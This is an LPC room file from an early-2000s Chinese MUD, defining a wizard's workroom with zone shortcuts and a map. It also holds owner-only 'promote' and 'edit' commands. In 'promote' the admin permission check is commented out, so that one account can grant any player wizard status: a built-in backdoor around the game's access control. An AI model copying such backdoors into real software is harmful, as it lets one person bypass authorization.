/*-------------------------------------------------------------
** 文件名: workroom.c
** Copyright (c) 2000-2001
** 创建人: Lisser
** 日  期: 2001/08/03
** 修改人: Lisser
** 日  期: 2001/08/10
** 描  述: 幻梦山庄
**-----------------------------------------------------------*/

#include <room.h>
#include <ansi.h>

inherit ROOM;

void reset();
int valid_leave();

void create()
{
        set("short",HIC "幻梦山庄" NOR);
        set("long","这里是幻梦山庄的院子，此处只有一间小屋，那是"+CYN"叶枫"NOR+"的家，在进门
的墙有一幅很大的地图(map)，上面标记了很多的符号。\n"
        );
        set("valid_startroom",1);

                                              
        set("exits", ([
                "th" : "/d/taohua/shuilong",
                "sl" : "/d/shaolin/guangchang1",
                "sn" : "/d/shenlong/tingkou",
                "xi" : "/d/xixia/dawu",
                "hz" : "/d/hangzhou/kedian",
                "wds" : "/d/wudang/sanqingdian",
                "xx" : "/d/xingxiu/xxh2",
                "gb" : "/d/gaibang/undertre",
                "gy" : "/d/taihu/qianyuan",
                "hs" : "/d/huashan/buwei1",
                "bt" : "/d/xingxiu/btyard",
                "dl" : "/d/dali/wangfu1",
                "em" : "/d/emei/hz_guangchang",
                "xs" : "/d/xueshan/guangchang",
                "yz" : "/d/city/guangchang",
                "qz" : "/d/quanzhou/zhongxin",
                "hs" : "/d/huashan/buwei1",
                "bt" : "/d/xingxiu/btyard",
                "dl" : "/d/dali/wangfu1",
                "em" : "/d/emei/hz_guangchang",
                "xs" : "/d/xueshan/guangchang",
                "wr" : "/d/wizard/wizard_room",
                "zn" : "/d/zhongnan/dajiaochang",
                "wg" : "/d/wuguan/zhengting",
                "enter": "/u/karlopex/workroom",
        ]));

        set("item_desc", ([
              "map" :
"
＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊
＊                                                            ＊
＊　华山hs，泉州qz，杨州yz，泰山ts，少林sl，武当wds，祈连ql   ＊
＊　丐帮gb，星宿xx，峨嵋em，白驼bt，雪山xs，桃花th， 神龙sn   ＊
＊　西夏xi，归云gy，大理dl，杭州hz，全真zn, 巫师wr， 武馆wg   ＊
＊　　　　　　　　　　　　　　　　　　　　　　　　　　　　　  ＊
＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊＊
\n",
          ]));

       set("outdoors", "karlopex");
       set("cost", 1);
       setup();
       //replace_program(ROOM);
}
void init()
{
		object me = this_player();
        if (getuid(me) == "karlopex")
{
                        add_action("do_promote", "promote");
                        add_action("do_edit", "edit");
}
		       	add_action("do_npc", "npc");
}

int valid_leave(object me, string dir)
{
        if (wizardp(me)) return ::valid_leave(me, dir); 
        if (!wizardp(me) && (dir == "yz" || (me->query("caninit") == "karlopex's workroom" && dir == "enter")) && getuid(me) != "karlopex")
        return ::valid_leave(me, dir);
        else return notify_fail(HIG"ＳＴＯＰ！你想去哪里？你还是去扬州(yz)吧！\n"NOR); 
}
int do_npc()
{
        string *dir, *dirx, roomx;
        object npc, room, me = this_player();
        int i, j;

        dir = get_dir("/d/");
        i = random(sizeof(dir) - 1);
		tell_object(me,HIC"\n现在的随机目录数是"+chinese_number(i)+"。\n");
        dirx = get_dir("/d/"+dir[i]+"/");
        j = random(sizeof(dirx) - 1);
		tell_object(me,HIC"\n现在的随机文件数是"+chinese_number(j)+"。\n");

        npc = new("/d/city/npc/liumang");
        roomx = "/d/"+dir[i]+"/"+dirx[j];
		tell_object(me,HIC"\n现在的随机房间是"+roomx+"。\n");
		if (!objectp(npc)) tell_object(me,HIC"\nNPC error!\n");
        if ( !(room = find_object(roomx)) )
                room = load_object(roomx);
        npc->move(room);
        tell_object(me,HIG"\n"+npc->query("name")+"被移动到"+room->query("short")+"。\n"NOR);
        return 1;
}
int do_edit(string file)
{
	object me=this_player();
	if( !file ) return notify_fail("指令格式：edit <档名>\n");

	if( in_edit(me) ) return notify_fail("你已经在使用编辑器了。\n");

	seteuid(geteuid(me));
	ed(resolve_path(me->query("cwd"), file));
	return 1;
}
int do_promote(string arg)
{
        object ob, me = this_player();
        string promotee,old_status, new_status,new_site;
        int my_level, ob_level, level;
        string uid, *wiz, wizlist;
        int i;



//        if( wizhood(me) != "(admin)" && wizhood(me) != "(arch)" && me->geteuid() != "karlopex" ) return 0;

        if( !arg )      return notify_fail("指令格式：promote <使用者> <等级> <Access IP> or promote list\n");

        if(arg == "list")
        {
                write( SECURITY_D->query_wizlist() );
                return 1;
        }


        if( sscanf(arg, "%s %s %s", promotee, new_status,new_site) != 3 )
                if( sscanf(arg, "%s %s", promotee, new_status)!=2 )
                        return notify_fail("指令格式：promote <使用者> <等级> <Access IP>\n");

        if( wiz_level(new_status) <= 0 && new_status != "(player)" ) return notify_fail("没有这种等级。\n");

        if( !objectp(ob = present(promotee, environment(me))) )
                ob = find_player(promotee);

        if( ob && !userp(ob) )
                return notify_fail("你只能改变使用者的权限。\n");

        if(!ob)
        {
                seteuid(getuid());
                ob = new("/clone/test/dummy");
                ob->set("id", promotee);
                if ( !ob->restore() )
                {
                        notify_fail("没有这个玩家。\n");
                }
                seteuid(getuid());
        }

        old_status = wizhood(ob);

        seteuid(getuid());
        if( !(SECURITY_D->set_status(ob, new_status,new_site,me->query("name")+"("+me->query("id")+")" )) )
                return notify_fail("修改失败。\n");

        message_vision("$N将$n的权限从 " + old_status + " 改为 " + new_status + "， 连线地址改为: " + new_site + " 。\n", me, ob);
        seteuid(getuid());
        ob->setup();

        return 1;
}

